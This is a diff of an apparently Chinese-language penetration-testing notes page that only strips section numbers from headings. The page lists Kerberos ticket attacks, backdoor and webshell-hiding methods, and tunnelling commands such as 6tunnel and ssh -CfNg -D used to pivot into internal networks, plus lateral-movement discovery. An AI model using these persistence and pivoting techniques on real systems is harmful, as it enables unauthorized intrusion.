-    <a href="#%e5%8a%a0%e5%af%86%e6%96%b9%e5%bc%8f%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.3 <strong>加密方式不同</strong></h4><p>金票：由krbtgt NTLM Hash 加密
+    <a href="#%e5%8a%a0%e5%af%86%e6%96%b9%e5%bc%8f%e4%b8%8d%e5%90%8c" class="header-mark"></a><strong>加密方式不同</strong></h4><p>金票：由krbtgt NTLM Hash 加密
 银票：由服务账号 NTLM Hash 加密</p>
 <h2 id="权限维持" class="headerLink">
-    <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" class="header-mark"></a>3 权限维持</h2><h4 id="1反弹shell" class="headerLink">
-    <a href="#1%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>3.0.4 1.反弹shell</h4><div class="highlight"><div class="chroma">
+    <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" class="header-mark"></a>权限维持</h2><h4 id="1反弹shell" class="headerLink">
+    <a href="#1%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>1.反弹shell</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1198,11 +1198,11 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="2webshell" class="headerLink">
-    <a href="#2webshell" class="header-mark"></a>3.0.5 2.webshell</h4><p>① 内存马隐藏
+    <a href="#2webshell" class="header-mark"></a>2.webshell</h4><p>① 内存马隐藏
 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合</p>
 <h4 id="3系统后门" class="headerLink">
-    <a href="#3%e7%b3%bb%e7%bb%9f%e5%90%8e%e9%97%a8" class="header-mark"></a>3.0.6 3.系统后门</h4><h5 id="windows" class="headerLink">
-    <a href="#windows" class="header-mark"></a>3.0.6.1 Windows</h5><p>① 利用任务计划定时反弹会话
+    <a href="#3%e7%b3%bb%e7%bb%9f%e5%90%8e%e9%97%a8" class="header-mark"></a>3.系统后门</h4><h5 id="windows" class="headerLink">
+    <a href="#windows" class="header-mark"></a>Windows</h5><p>① 利用任务计划定时反弹会话
 ② 利用开机启动项
 ③ 影子账户以及guest账户
 ④ 注册表
@@ -1211,7 +1211,7 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 ⑦ DLL劫持
 ⑧ 进程注入</p>
 <h5 id="linux" class="headerLink">
-    <a href="#linux" class="header-mark"></a>3.0.6.2 Linux</h5><p>① ssh、openssh后门
+    <a href="#linux" class="header-mark"></a>Linux</h5><p>① ssh、openssh后门
 ② 任务计划
 ③ VIM后门
 ④ 添加超级用户
@@ -1219,7 +1219,7 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 ⑥ 利用自启动程序
 ⑦ rootkit后门</p>
 <h4 id="4利用iis等服务制作后门" class="headerLink">
-    <a href="#4%e5%88%a9%e7%94%a8iis%e7%ad%89%e6%9c%8d%e5%8a%a1%e5%88%b6%e4%bd%9c%e5%90%8e%e9%97%a8" class="header-mark"></a>3.0.7 4.利用IIS等服务制作后门</h4><p>常用隧道建立工具</p>
+    <a href="#4%e5%88%a9%e7%94%a8iis%e7%ad%89%e6%9c%8d%e5%8a%a1%e5%88%b6%e4%bd%9c%e5%90%8e%e9%97%a8" class="header-mark"></a>4.利用IIS等服务制作后门</h4><p>常用隧道建立工具</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png" title="image-20230714132507946" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png">
         <img
             
@@ -1230,20 +1230,20 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
             alt="image-20230714132507946">
     </a></figure></p>
 <h5 id="41-探测是否出网" class="headerLink">
-    <a href="#41-%e6%8e%a2%e6%b5%8b%e6%98%af%e5%90%a6%e5%87%ba%e7%bd%91" class="header-mark"></a>3.0.7.1 4.1 探测是否出网</h5><ul>
+    <a href="#41-%e6%8e%a2%e6%b5%8b%e6%98%af%e5%90%a6%e5%87%ba%e7%bd%91" class="header-mark"></a>4.1 探测是否出网</h5><ul>
 <li>ICMP：ping IP；</li>
 <li>TCP：nc -zv ip 端口；</li>
 <li>HTTP：curl www.xxx；</li>
 <li>DNS：nslookup [www.baidu.com]</li>
 </ul>
 <h5 id="42-网络层常用隧道" class="headerLink">
-    <a href="#42-%e7%bd%91%e7%bb%9c%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.2 4.2 网络层常用隧道</h5><p><strong>IPv6隧道</strong></p>
+    <a href="#42-%e7%bd%91%e7%bb%9c%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>4.2 网络层常用隧道</h5><p><strong>IPv6隧道</strong></p>
 <p>kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。</p>
 <p>使用：</p>
 <p>首先开启目标机上的IPV6,ipconfig查看ipv6地址</p>
 <p>kali：6tunnel -4 80 targetipv6IP 80   #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务；</p>
 <h5 id="43-传输层常用隧道" class="headerLink">
-    <a href="#43-%e4%bc%a0%e8%be%93%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.3 4.3 传输层常用隧道</h5><p><strong>IOX</strong></p>
+    <a href="#43-%e4%bc%a0%e8%be%93%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>4.3 传输层常用隧道</h5><p><strong>IOX</strong></p>
 <p>github：https://github.com/EddieIvan01/iox</p>
 <p>使用，比如我们将内网的3389端口转发到我们的attackhost：</p>
 <div class="highlight"><div class="chroma">
@@ -1298,7 +1298,7 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="44-应用层常用隧道" class="headerLink">
-    <a href="#44-%e5%ba%94%e7%94%a8%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.4 4.4 应用层常用隧道</h5><p><strong>SSH</strong></p>
+    <a href="#44-%e5%ba%94%e7%94%a8%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>4.4 应用层常用隧道</h5><p><strong>SSH</strong></p>
 <p>ssh常用参数：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1337,12 +1337,12 @@ web服务器：192.168.1.2
 <p>① 攻击机执行：ssh -CfNg -D 2022 <a href="mailto:root@192.168.1.2" rel="">root@192.168.1.2</a>
 ② 本地设置socks代理后即可访问数据库服务器</p>
 <h5 id="45-dnsiodine" class="headerLink">
-    <a href="#45-dnsiodine" class="header-mark"></a>3.0.7.5 4.5 DNS（iodine）</h5><p>要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined；</p>
+    <a href="#45-dnsiodine" class="header-mark"></a>4.5 DNS（iodine）</h5><p>要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined；</p>
 <h2 id="横向移动" class="headerLink">
-    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8" class="header-mark"></a>4 横向移动</h2><p>通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。</p>
+    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8" class="header-mark"></a>横向移动</h2><p>通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。</p>
 <h4 id="内网主机存活探测" class="headerLink">
-    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e5%ad%98%e6%b4%bb%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.8 内网主机存活探测</h4><h5 id="1icmp" class="headerLink">
-    <a href="#1icmp" class="header-mark"></a>4.0.8.1 1.ICMP</h5><div class="highlight"><div class="chroma">
+    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e5%ad%98%e6%b4%bb%e6%8e%a2%e6%b5%8b" class="header-mark"></a>内网主机存活探测</h4><h5 id="1icmp" class="headerLink">
+    <a href="#1icmp" class="header-mark"></a>1.ICMP</h5><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1379,7 +1379,7 @@ web服务器：192.168.1.2
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2nmap" class="headerLink">
-    <a href="#2nmap" class="header-mark"></a>4.0.8.2 2.nmap</h5><div class="highlight"><div class="chroma">
+    <a href="#2nmap" class="header-mark"></a>2.nmap</h5><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1396,8 +1396,8 @@ web服务器：192.168.1.2
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="内网主机端口探测" class="headerLink">
-    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9 内网主机端口探测</h4><h5 id="1单个端口探测" class="headerLink">
-    <a href="#1%e5%8d%95%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9.1 1.单个端口探测</h5><div class="highlight"><div class="chroma">
+    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>内网主机端口探测</h4><h5 id="1单个端口探测" class="headerLink">
+    <a href="#1%e5%8d%95%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>1.单个端口探测</h5><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1420,7 +1420,7 @@ web服务器：192.168.1.2
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2多个端口探测" class="headerLink">
-    <a href="#2%e5%a4%9a%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9.2 2.多个端口探测</h5><div class="highlight"><div class="chroma">
+    <a href="#2%e5%a4%9a%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>2.多个端口探测</h5><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1432,7 +1432,7 @@ web服务器：192.168.1.2
 </div>
 </div><p>通过代理后使用nmap、msf进行扫描</p>
 <h3 id="横向移动方法" class="headerLink">
-    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>4.1 横向移动方法：</h3><ul>
+    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>横向移动方法：</h3><ul>
 <li>利用ms17010等系统漏洞</li>
 <li>对跳板机密码进行抓取，使用抓取到密码爆破内网其他主机</li>
 <li>利用EDR、堡垒机、云管平台、vmware esxi等集权系统漏洞</li>
